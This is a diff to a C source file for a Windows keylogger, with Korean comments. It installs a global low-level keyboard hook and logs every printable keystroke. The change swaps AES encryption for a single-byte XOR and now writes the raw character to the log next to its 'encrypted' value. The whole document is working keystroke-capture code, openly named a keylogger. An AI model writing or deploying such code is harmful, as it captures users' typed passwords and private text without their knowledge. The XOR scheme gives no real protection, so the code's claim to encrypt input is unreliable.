@@ -1,12 +1,10 @@
 #include <windows.h>
-#include <stdlib.h>
+#include <stdio.h>
 #include "../include/input_encrypt.h"
-#include "../include/crypto.h"
 #include "../include/logger.h"
 
-char *base64_encode(const unsigned char *data, size_t len);
-
 static HHOOK hKeyHook = NULL;
+static const char XOR_KEY = 0x5A; // 간단한 XOR 키
 
 // 키코드 → 문자 변환
 static char vk_to_char(KBDLLHOOKSTRUCT *kbStruct)
@@ -26,30 +24,32 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
     {
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
-        char ch = vk_to_char(p);
-        if (ch >= 32 && ch <= 126)
+        char inputChar = vk_to_char(p);
+
+        if (inputChar >= 32 && inputChar <= 126)
         {
-            unsigned char *cipher;
-            int clen = aes_encrypt((unsigned char *)&ch, 1, &cipher);
-            if (clen > 0)
-            {
-                char *b64 = base64_encode(cipher, clen);
-                write_logf("[AES] %s", b64);
-                free(cipher);
-                free(b64);
-            }
-            else
-            {
-                write_log("[ERROR] AES 암호화 실패.");
-            }
+            char encrypted = inputChar ^ XOR_KEY;
+
+            char log_msg[128];
+            snprintf(log_msg, sizeof(log_msg),
+                     "[Encrypted Key] Raw: %c (0x%02X), Encrypted: 0x%02X",
+                     inputChar, inputChar, encrypted);
+            write_log(log_msg);
         }
     }
+
     return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
 void initialize_encrypted_keylogger(void)
 {
     hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
-    write_log(hKeyHook ? "[INFO] AES 키보드 훅 설치 완료."
-                       : "[ERROR] AES 키보드 훅 설치 실패.");
+    if (hKeyHook == NULL)
+    {
+        write_log("[ERROR] 키보드 후킹 설치 실패 (암호화 입력 감지 불가).");
+    }
+    else
+    {
+        write_log("[INFO] 키보드 암호화 입력 훅 설치 완료.");
+    }
 }
